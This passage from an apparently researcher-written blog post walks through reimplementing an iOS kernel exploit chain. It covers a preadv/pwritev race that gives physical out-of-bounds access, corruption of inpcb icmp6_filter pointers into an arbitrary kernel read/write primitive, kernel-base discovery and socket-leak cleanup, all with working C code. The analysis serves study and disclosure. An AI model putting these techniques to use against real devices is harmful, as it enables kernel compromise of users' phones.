IOSurfaceRef surface = IOSurfaceCreate(properties);
IOSurfacePrefetchPages(surface);
```
<figcaption>IOSurfacePrefetchPages</figcaption>

#### Going out-of-bounds

It's now really important to mention a sort of weird and counterintuitive detail of this exploit: the `pwritev` syscall is used as a read primitive while the `preadv` syscall is used as a write primitive! Their names describe the operation from a _file descriptor's_ perspective:

* `pwritev` will read from a buffer in memory and write to a file descriptor.
* `preadv` will read from a file descriptor and write to a buffer in memory.

We are now ready to race! We iterate through the search mapping, one page at a time, and for each page we attempt to read out-of-bounds. We begin by setting up the misaligned `iov`:

```c
// set iov base to physically contiguous addr + 0x3f00
g_ctx.iov.iov_base = (void*)(g_ctx.pc_address + 0x3f00);
// offset is oob_offset, size is oob_size, so 0x100 + 0xf00 = 0x1000
g_ctx.iov.iov_len = offset + size;
```
<figcaption>Crafting iovec</figcaption>

We then write a marker into the mapping’s second page. 
When reading the result written back to the read file descriptor, if the marker is not present, we know we're reading from an arbitrary physical page.
We then prepare `free_thread`, which is the thread that swaps the mappings.

```c
w = pwritev(g_ctx.read_fd, &g_ctx.iov, 1, 0x3f00);
while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);
```
<figcaption>Vulnerability trigger in main thread</figcaption>

We call the trigger syscall with our crafted `iov` with its backing buffer being the physically contiguous two page mapping from **PurpleGfxMem**. In the secondary thread "free_thread", once it gets the `race_sync` signal:

```c
mach_vm_map(mach_task_self(), &target_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_object, target_object_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
```
<figcaption>Vulnerability trigger in free_thread</figcaption>

The thread replaces the two **PurpleGfxMem** pages with two pages from the current search mapping. To win the race, this replacement must occur after `cluster_io_type` selects `IO_CONTIG` but before the second `vm_map_get_upl` call. If it occurs after that second call, we are too late. On success, we read or wrote `0xf00` bytes!

<figure>
<object type="image/svg+xml" data="{{ '/assets/img/clearsword/mapping_slider.svg' | relative_url }}"></object>
<figcaption>Physical Out-of-Bounds Read/Write</figcaption>
</figure>

After probing the potentially out-of-bounds page, we move on to `find_and_corrupt_socket`.
Inside this function, we search for the oracle: our executable name.

```c
struct inpcb {
	decl_lck_mtx_data(, inpcb_mtx); /* inpcb per-socket mutex */
	LIST_ENTRY(inpcb) inp_hash;     /* hash list */
	LIST_ENTRY(inpcb) inp_list;     /* list for all PCBs of this proto */
	void    *inp_ppcb;              /* pointer to per-protocol pcb */
	struct inpcbinfo *inp_pcbinfo;  /* PCB list info */
	struct socket *inp_socket;      /* back pointer to socket */
	LIST_ENTRY(inpcb) inp_portlist; /* list for this PCB's local port */
	RB_ENTRY(inpcb) infc_link;      /* link for flowhash RB tree */
	struct inpcbport *inp_phd;      /* head of this list */
	inp_gen_t inp_gencnt;           /* generation count of this instance */

  /* ... */

	struct {
		/* IP options */
		struct mbuf *inp6_options;
		/* IP6 options for outgoing packets */
		struct  ip6_pktopts *inp6_outputopts;
		/* IP multicast options */
		struct  ip6_moptions *inp6_moptions;
		/* ICMPv6 code type filter */
		struct  icmp6_filter *inp6_icmp6filt;
		/* IPV6_CHECKSUM setsockopt */
		int     inp6_cksum;
		short   inp6_hops;
	} inp_depend6;

  /* ... */

	char inp_last_proc_name[MAXCOMLEN + 1];
	char inp_e_proc_name[MAXCOMLEN + 1];

	uint64_t inp_max_pacing_rate; /* Per-connection maximumg pacing rate to be enforced (Bytes/second) */
};
```
<figcaption>inpcb struct (simplified)</figcaption>

Our executable name is present in the `inpcb` struct, in the `inp_last_proc_name` field! This is the entire reason we get our executable name in the first place. This helps us locate possible `inpcb` structs in memory. From here, we do one more search, looking for "corrupted_filter_marker", with its value set to `0x0000ffffffffffff`... This value consists of the default value of `-1` for both `inp6_cksum` and `inp6_hops`, plus padding, since `inp6_cksum` is 4 bytes and `inp6_hops` is 2 bytes.

```c
// in_pcb.h
#define in6p_hops  inp_depend6.inp6_hops
#define in6p_cksum inp_depend6.inp6_cksum

// bsd/netinet6/icmp6.c icmp6_dgram_attach
struct inpcb *__single inp;
/* ... */
inp->in6p_hops = -1;       /* use kernel default */
inp->in6p_cksum = -1;
```
<figcaption>inp6_cksum/inp6_hops defaults</figcaption>

After verifying the oracle we found actually belongs to an `inpcb` struct, we proceed to read its `inpcb->inp_gencnt` value, and compare it to the generation counts we've saved when spraying sockets, trying to find a match. Once we do, we've found the socket corresponding to the `inpcb` struct we found in memory! With this, we can proceed to do actual memory corruption and get our hands on an arbitrary read/write primitive.

## <del>TFP0</del> Arbitrary Read/Write

<figure>
<img src="{{ '/assets/img/clearsword/no-tengo-tfp0.png' | relative_url }}" alt="no tengo tfp0" style="max-width: 50%;">
<figcaption>TFP0 is dead :(</figcaption>
</figure>

After **Apple** completely butchered **tfp0** with iOS 14, we have to build an arbitrary read/write primitive using the relative out-of-bounds primitive we have.

After confirming that an adjacent out-of-bounds page contains an `inpcb` struct and identifying its socket through `gencnt`, we use the primitive to construct a stable 32-byte arbitrary read/write primitive.

Back to the `inpcb` struct, every `inpcb` struct has a `LIST_ENTRY`, which contains two pointers: one is a pointer to the next `inpcb` struct in the linked list and the other one is a pointer to the previous `inpcb`'s _next_ pointer. This means that, if we read `inpcb->inp_list.le_next`, we retrieve the address of the next `inpcb` struct and if we read `inpcb->inp_list.le_prev`, we get the address of `prev_inpcb->inp_list.le_next`. If we subtract `inp_list.le_next`'s offset from this pointer, we get the address of the previous `inpcb` struct in the linked list! 

```c
LIST_ENTRY(inpcb) inp_list; // struct inpcb
		|
		v
struct inpcb64_list_entry {
	u_int64_t   le_next;
	u_int64_t   le_prev;
};

inpcb->inp_list.le_next  -> pointer to next inpcb
inpcb->inp_list.le_prev  -> pointer to previous inpcb's inp_list.le_next 
```
<figcaption>LIST_ENTRY layout</figcaption>

This is where it gets a little confusing again. The _previous_ `inpcb` in the list is actually _newer_ and will therefore have a larger `gencnt`, because `inpcb`'s are inserted into the linked list at the _head_. We must be careful at the _head_ of the list because its `inpcb->inp_list.le_prev` won't be pointing at an `inpcb`, it'll instead point to an `inpcbhead` struct, which is an entirely different struct!

<figure>
<img src="{{ '/assets/img/clearsword/two_inpcb.svg' | relative_url }}" alt="two inpcb">
<figcaption>inpcb relation</figcaption>
</figure>

Let's recap here:
- We found an adjacent page out-of-bounds to a page in our search mapping that contains an `inpcb` struct
- After analysing this `inpcb` struct we found a pointer to the previous `inpcb` in the `inpcb` linked list, which is a newer `inpcb`.

What can we possibly do with this? **Memory corruption!**

In the `inpcb` struct, there's an `inp_depend6` struct, which contains a pointer to an `icmp6_filter` struct. This structure doesn't have anything special about it:

```c
struct icmp6_filter {
	u_int32_t icmp6_filt[8];
};
```
<figcaption>icmp6_filter struct</figcaption>

It's just an array of 8 `u_int32_t`'s, which are unsigned integers, and as such, 4 bytes each. We can read and write icmp6 filters to this array by using `setsockopt`/`getsockopt`:
```c
setsockopt(socket, IPPROTO_ICMPV6, ICMP6_FILTER, filter_buf, sizeof(filter_buf)); // write filter to array
getsockopt(socket, IPPROTO_ICMPV6, ICMP6_FILTER, filter_buf, sizeof(filter_buf)); // read filter from array
```
<figcaption>Filter corruption</figcaption>

What would happen if, with our primitive, we replaced the `icmp6_filter` pointer from the `inpcb` we found, with the address of the `icmp6_filter` of the _previous_ `inpcb` in the list?

```c
// since we'll write 0xf00, but we only want to overwrite 8 bytes, we need
// to copy all data so we don't corrupt everything else
memcpy(write_buffer, read_buffer, g_ctx.oob_size);  // 0xf00
// set control socket pcb icmp6filter pointer field to rw_socket pcb + icmp6filt_offset
// when we write to control socket icmp6filter, we'll control where rw_socket icmp6filter points to
*(uint64_t*)((uint8_t*)write_buffer + pcb_start_offset + offsets.inpcb_icmp6filt) = inp_list_next_pointer + offsets.inpcb_icmp6filt;
*(uint64_t*)((uint8_t*)write_buffer + pcb_start_offset + offsets.inpcb_icmp6filt + 8) = 0;

LOG("corrupting icmp6filter pointer...");
// we're corrupting ptr to this struct
// 8*4 = 32 bytes
// 32 byte prim
/*
	struct icmp6_filter {
		u_int32_t icmp6_filt[8];
	};
*/
while (true) {
	// write
	physical_oob_write_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, write_buffer);
	// read info back to check if we really corrupted
	physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
	uint64_t new_icmp6filter = 0;
	memcpy(&new_icmp6filter, read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt, sizeof(new_icmp6filter));
	if (new_icmp6filter == inp_list_next_pointer + offsets.inpcb_icmp6filt) {
		LOG("target corrupted: %#llx", new_icmp6filter);
		break;
	}
}
```
<figcaption>Corrupting icmp6_filter pointer</figcaption>

We copy the `0xf00` bytes from `read_buffer` into `write_buffer`, then replace the discovered `inpcb`'s `icmp6_filter` pointer with the address of the previous `inpcb`'s `icmp6_filter` field. We write the modified `0xf00` bytes back to the out-of-bounds page, read them again, and verify that the corruption succeeded. But what did we actually achieve?

Let's assume 2 sockets: the _control_ socket and the _rw_ socket. We've just corrupted `control_socket->inpcb->inp_depend6->inp6_icmp6filt` to point to `rw_socket->inpcb->inp_depend6->inp6_icmp6filt`. This means that, when we `setsockopt` on the control socket's `icmp6_filter`, we're actually overwriting _rw_ socket's `icmp6_filter` pointer, so we can point it to any arbitrary address! So now, when we `getsockopt` or `setsockopt` on _rw_'s socket `icmp6_filter`, we read or write 32 bytes of data at the address _rw_ socket's `icmp6_filter` now points to! We now have our stable arbitrary read/write primitive.

```c
// set the address we want to read from
memcpy(g_ctx.control_data, &where, sizeof(where));
// since control_socket->inpcb->inp_depend6->inp6_icmp6filt points to rw_socket->inpcb->inp_depend6->inp6_icmp6filt
// we're rewriting rw_socket's icmp6filt pointer to point to any address we want
int res = setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.control_data, sizeof(g_ctx.control_data));

// now when we read rw_socket icmp6filt we're reading 32-bytes from "where"
getsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.read_buffer, (socklen_t*)&size);
```
<figcaption>Arbitrary read primitive</figcaption>

With corruption successful and a stable arbitrary read/write primitive achieved, all that's left is finding the kernel base address (and kernel slide) and cleanup.

To find the kernel base address, we need to find a useful kernel binary pointer. We can find one by traversing through the `inpcbinfo` struct, then from it into `ipi_zone`, and finally `zv_name`. This points to a string in the kernel binary, very close to the kernel header, in the `__TEXT` segment. We page align this pointer and then iterate backwards in page size decrements until we find a Mach-O header which looks like a possible kernel header magic. 

```c
struct mach_header_64 {
  uint32_t  magic;    /* mach magic number identifier */
  cpu_type_t  cputype;  /* cpu specifier */
  cpu_subtype_t cpusubtype; /* machine specifier */
  uint32_t  filetype; /* type of file */
  uint32_t  ncmds;    /* number of load commands */
  uint32_t  sizeofcmds; /* the size of all the load commands */
  uint32_t  flags;    /* flags */
  uint32_t  reserved; /* reserved */
};
```
<figcaption>Mach-O header</figcaption>

The Mach-O magic is `0xfeedfacf` and the expected cputype is `ARM64` aka `0x100000c`. We then confirm if `cpusubtype` and `filetype` match the expected values. If it all matches, we have found the kernel base address. We then calculate the kernel slide by subtracting the static kernel base address (`0xfffffff007004000`) from the found kernel base address.

```c
uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + 0x38);
uint64_t ipi_zone = early_kread64(pcbinfo_pointer + 0x68);
uint64_t zv_name = early_kread64(ipi_zone + 0x10);

uint64_t kernel_base = zv_name & 0xFFFFFFFFFFFFC000;
while (true) {
	if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
		uint64_t hdr = early_kread64(kernel_base + 0x8);
		// if (hdr == 0xc00000002 || hdr == 0xB00000000) {
		if (hdr == 0xCC0000002) {
			break;
		}
	}
	kernel_base -= vm_page_size;
}

g_ctx.kernel_base = kernel_base;
g_ctx.kernel_slide = kernel_base - 0xfffffff007004000;
```
<figcaption>Finding kernel base</figcaption>

With the kernel base address and kernel slide found, all that's left is cleaning up, which is really simple. We just need to leak our corrupted sockets.

We find the socket kernel address for both `rw_socket` and `control_socket` by reading from the `inp_socket` field in the `inpcb` struct for both. The `socket` struct contains two reference counting fields: `so_usecount` and `so_retaincnt`. We'll increment both of these fields substantially, so that even if we close the sockets, their memory won't be freed because the retain counts remain greater than 0.

```c
// inpcb->inp_socket
uint64_t control_socket_addr = early_kread64(g_ctx.control_socket_pcb + g_offsets.inpcb_inp_socket);
uint64_t rw_socket_addr = early_kread64(g_ctx.rw_socket_pcb + g_offsets.inpcb_inp_socket);

// socket->so_usecount
uint64_t control_socket_so_count = early_kread64(control_socket_addr + g_offsets.socket_so_count);
uint64_t rw_socket_so_count = early_kread64(rw_socket_addr + g_offsets.socket_so_count);

// increase ref count
// 	int             so_usecount;
// 	int             so_retaincnt;
// since they're both 4 bytes, an 8 byte write will overwrite both
early_kwrite64(control_socket_addr + g_offsets.socket_so_count, control_socket_so_count + 0x0000100100001001);
early_kwrite64(rw_socket_addr + g_offsets.socket_so_count, rw_socket_so_count + 0x0000100100001001);
```
<figcaption>Corrupted socket cleanup</figcaption>

And with this, we're done. Or are we?

## Open questions

The original implementation of this exploit contained a bug that simply made it impossible for the code to ever get past the first search mapping. The code would try to map _every_ single page of the search mapping, because at the time the implementation mapped two pages at a time. This meant that, at the last page of the mapping, the code would be trying to map a page outside the realm of our search mapping, so the `free_thread` would error out and terminate the process, preventing the exploit from ever completing.
The original buggy logic has been replaced in **ClearSword** [here](https://github.com/TheRealClarity/ClearSword/blob/master/clearsword/poc.c#L180). This makes it so that it never attempts to map 2 pages, when only 1 page is left in the mapping. I've never had a successful run outside the first mapping, but I've never had it hit the end of the first mapping either, so I can at least see a way where this slipped through...

```c
// buggy logic
while (seeking_offset < search_mapping_size)
// fixed logic in ClearSword
while (seeking_offset <= search_mapping_size - contiguous_mapping_size)
```
<figcaption>Corrected search mapping logic in ClearSword</figcaption>

There's a second "bug", if we may call it that. The original implementation assumed an `inpcb` struct would always be on a `0x400` boundary, so it would find a candidate `inpcb` through the oracle, mask its offset in the out-of-bounds page by `0x3ff`, and then add the expected offset of the `icmp6_filter` in the `inpcb` struct, and verify if such matched the expected value. The thing is, for several versions of iOS, this would never be true (mainly for iOS 15 and iOS 16). Granted, the chain only **supposedly** targeted iOS 18.4 up to iOS 18.7, but still, this is too... low quality, lazy, for such a sophisticated exploit chain. 

So the final open questions are:
- How did such a sophisticated malware contain such simple to fix bugs in its implementation?
- If it was never possible to use search mappings other than the first one, why did they even bother with allocating eight of them?
- Was this even tested properly? The fact the supported iOS version range is so small and these bugs are present makes me doubt they even cared if it worked at all...

## Conclusion

We went through a lot with this writeup, from the root cause of the vulnerability, to exploitation to building a stable kernel read and write primitive. 

I tried making it as detailed and comprehensible as possible, but it's very hard to do so with a topic that is as technical as kernel exploitation is. I hope you found it insightful and that you learned something new. 

Writing my own implementation of **DarkSword** with **ClearSword** was a very fun experience. It allowed me to look in-depth into a kernel exploit for the latest major iOS version available and also to experiment with things that would not have been possible otherwise.

<figure>
<img src="{{ '/assets/img/clearsword/iykyk.jpg' | relative_url }}" alt="iykyk">
<figcaption>iykyk</figcaption>
</figure>

In case you have any doubts, questions or if you simply want to chat, you can get in contact with me over [X (Twitter)](https://x.com/imnotclarity) at @imnotclarity or [Discord](https://discord.com/) (@notclarity). I'm also available through email at [therealclarity@protonmail.com](mailto:therealclarity@protonmail.com).